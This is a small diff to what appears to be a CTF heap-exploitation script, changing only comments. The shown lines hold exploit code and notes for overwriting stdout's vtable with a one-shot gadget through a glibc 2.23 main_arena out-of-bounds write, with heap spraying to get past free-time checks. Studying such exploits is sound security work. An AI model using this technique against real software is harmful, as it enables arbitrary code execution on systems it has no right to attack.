@@ -83,9 +83,9 @@ def pwn():
 	# and overwrite stdout's vtable pointer
 	alloc(0x80, p64(0xdeadbeef)*4 + p64(0) + p64(0x17c1) + p64(0xcafebabe)*5 + p64(oneshot)) #22
 	
-	# main_arena OOB write => overwrite stdout's vtable with chunk #22
+	# main_arena OOB write => overwrite stdout's vtable with chunk #16
 	# ___printf_chk will get called once we delete a chunk, which will invoke
-	#  _IO_sputn which is at vtable + 0x38 where we placed one shot gadget's address
+	#  _IO_sputn which is at [vtable + 0x38], where we placed one shot gadget's address
 	# we call update(19, 0x800, p64(0x31) * (0x800/8)) in order to spray the heap with 
 	# valid chunk_at_offset (chunk_16, 0x17c1) sizes to keep _int_free from complaining
 	# See https://github.com/str8outtaheap/heapwn/blob/master/malloc/malloc-2.23.c#L3896
